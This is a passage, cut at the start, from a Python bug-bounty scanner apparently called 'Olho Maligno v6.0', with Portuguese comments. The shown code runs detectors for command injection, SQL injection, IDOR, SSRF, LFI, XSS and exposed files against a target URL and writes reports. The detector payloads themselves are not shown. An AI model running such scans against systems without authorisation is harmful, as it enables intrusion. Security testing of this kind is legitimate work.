        self.http_client = ProAdvancedHTTPClient(proxy=proxy)
        self.exploits: List[ExploitableVulnerability] = []
        self.lock = Lock()
    
    def run_full_scan(self) -> List[ExploitableVulnerability]:
        """Executa scan profissional completo"""
        logger.info(f"{Fore.CYAN}╔═ OLHO MALIGNO v6.0 PROFESSIONAL ═╗{Style.RESET_ALL}")
        logger.info(f"{Fore.GREEN}🎯 Target: {self.target_url}{Style.RESET_ALL}")
        logger.info(f"{Fore.YELLOW}⚙️  Iniciando scan completo...{Style.RESET_ALL}\n")
        
        # 1. Reconnaissance
        logger.info(f"{Fore.MAGENTA}[RECON] Descobrindo endpoints...{Style.RESET_ALL}")
        recon = ReconnaissanceEngine(urlparse(self.target_url).netloc, self.http_client)
        endpoints = recon.enumerate_common_endpoints(self.target_url)
        
        # 2. Detecção de RCE
        logger.info(f"{Fore.MAGENTA}[RCE] Testando command injection...{Style.RESET_ALL}")
        rce_detector = RCEDetector(self.http_client)
        rce_results = rce_detector.detect_command_injection(self.target_url, 
                                                            ['id', 'cmd', 'command', 'exec'])
        self.exploits.extend(rce_results)
        
        # 3. Detecção de SQL Injection
        logger.info(f"{Fore.MAGENTA}[SQLi] Testando SQL injection...{Style.RESET_ALL}")
        sqli_detector = SQLiDetector(self.http_client)
        sqli_results = sqli_detector.detect_time_based(self.target_url,
                                                       ['id', 'user_id', 'product_id', 'order_id'])
        self.exploits.extend(sqli_results)
        
        # 4. Detecção de IDOR
        logger.info(f"{Fore.MAGENTA}[IDOR] Testando enumeração de IDs...{Style.RESET_ALL}")
        idor_detector = IDORDetector(self.http_client)
        idor_results = idor_detector.detect_idor(self.target_url,
                                                 ['id', 'user_id', 'object_id', 'item_id'])
        self.exploits.extend(idor_results)
        
        # 5. Detecção de Dados Sensíveis
        logger.info(f"{Fore.MAGENTA}[DATA] Procurando dados sensíveis...{Style.RESET_ALL}")
        data_detector = SensitiveDataDetector(self.http_client)
        data_results = data_detector.detect_exposed_files(self.target_url)
        self.exploits.extend(data_results)
        
        # 6. Detecção de SSRF
        logger.info(f"{Fore.MAGENTA}[SSRF] Testando server-side requests...{Style.RESET_ALL}")
        ssrf_detector = SSRFDetector(self.http_client)
        ssrf_results = ssrf_detector.detect_ssrf(self.target_url, ['url', 'fetch', 'image_url'])
        self.exploits.extend(ssrf_results)
        
        # 7. Detecção de LFI
        logger.info(f"{Fore.MAGENTA}[LFI] Testando file inclusion...{Style.RESET_ALL}")
        lfi_detector = LFIDetector(self.http_client)
        lfi_results = lfi_detector.detect_lfi(self.target_url, ['file', 'page', 'include', 'path'])
        self.exploits.extend(lfi_results)
        
        # 8. Detecção de XSS
        logger.info(f"{Fore.MAGENTA}[XSS] Testando cross-site scripting...{Style.RESET_ALL}")
        xss_detector = XSSDetector(self.http_client)
        xss_results = xss_detector.detect_xss(self.target_url,
                                              ['q', 'search', 'comment', 'name', 'message'])
        self.exploits.extend(xss_results)
        
        logger.info(f"\n{Fore.GREEN}✓ Scan concluído!{Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}Total de bugs encontrados: {len(self.exploits)}{Style.RESET_ALL}\n")
        
        return self.exploits
    
    def print_results(self):
        """Imprime resultados formatados"""
        print(f"\n{Fore.RED}{'═' * 80}{Style.RESET_ALL}")
        print(f"{Fore.RED}BUGS EXPLORÁVEIS ENCONTRADOS{Style.RESET_ALL}")
        print(f"{Fore.RED}{'═' * 80}\n{Style.RESET_ALL}")
        
        by_severity = {}
        for exploit in self.exploits:
            sev = exploit.severity.name
            if sev not in by_severity:
                by_severity[sev] = []
            by_severity[sev].append(exploit)
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            exploits = by_severity.get(severity, [])
            if exploits:
                color = exploits[0].severity.value[1]
                print(f"{color}[{exploits[0].severity.value[0]}] {len(exploits)} bugs{Style.RESET_ALL}")
                
                for i, exploit in enumerate(exploits, 1):
                    print(f"\n  #{i} {exploit.title}")
                    print(f"     🔗 URL: {exploit.target_url}")
                    if exploit.parameter:
                        print(f"     🎯 Parâmetro: {exploit.parameter}")
                    print(f"     💰 Bounty: {exploit.bounty_value}")
                    print(f"     📊 CVSS: {exploit.cvss_score}/10")
                    print(f"     📝 Impacto: {exploit.business_impact}")
    
    def generate_report(self, format='json'):
        """Gera relatório em diferentes formatos"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if format == 'json':
            data = {
                'target': self.target_url,
                'timestamp': timestamp,
                'total_bugs': len(self.exploits),
                'exploits': [e.to_dict() for e in self.exploits]
            }
            
            filepath = f"olho_maligno_report_{timestamp}.json"
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)
            
            logger.info(f"Relatório JSON: {filepath}")
        
        elif format == 'markdown':
            md = f"# 🔮 Olho Maligno - Bug Bounty Report\n\n"
            md += f"**Target:** {self.target_url}\n"
            md += f"**Data:** {timestamp}\n"
            md += f"**Total de Bugs:** {len(self.exploits)}\n\n"
            
            for exploit in self.exploits:
                md += f"## {exploit.title}\n"
                md += f"- **Severidade:** {exploit.severity.value[0]}\n"
                md += f"- **URL:** `{exploit.target_url}`\n"
                md += f"- **Impacto:** {exploit.business_impact}\n"
                md += f"- **Bounty:** {exploit.bounty_value}\n"
                md += f"- **CVSS:** {exploit.cvss_score}/10\n\n"
            
            filepath = f"olho_maligno_report_{timestamp}.md"
            with open(filepath, 'w') as f:
                f.write(md)
            
            logger.info(f"Relatório Markdown: {filepath}")

# ════════════════════════════════════════════════════════════════════════════
# CLI PROFISSIONAL
# ════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description='🔮 OLHO MALIGNO v6.0 - Professional Bug Bounty Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXEMPLOS:
  python olho_maligno_v6.py https://example.com
  python olho_maligno_v6.py https://example.com --proxy http://127.0.0.1:8080
  python olho_maligno_v6.py https://example.com --subfinder --report markdown
        """
    )
    
    parser.add_argument('url', help='URL alvo')
    parser.add_argument('--proxy', help='Proxy (http://ip:port)')
    parser.add_argument('--subfinder', action='store_true', help='Usar Subfinder')
    parser.add_argument('--report', choices=['json', 'markdown'], default='json',
                       help='Formato do relatório')
    
    args = parser.parse_args()
    
    try:
        scanner = OlhoMalignoV6Professional(
            target_url=args.url,
            proxy=args.proxy,
            use_subfinder=args.subfinder
        )
        
        exploits = scanner.run_full_scan()
        scanner.print_results()
        scanner.generate_report(format=args.report)
        
        return 0
    
    except Exception as e:
        logger.error(f"Erro: {e}")
        return 1

if __name__ == '__main__':
    sys.exit(main())
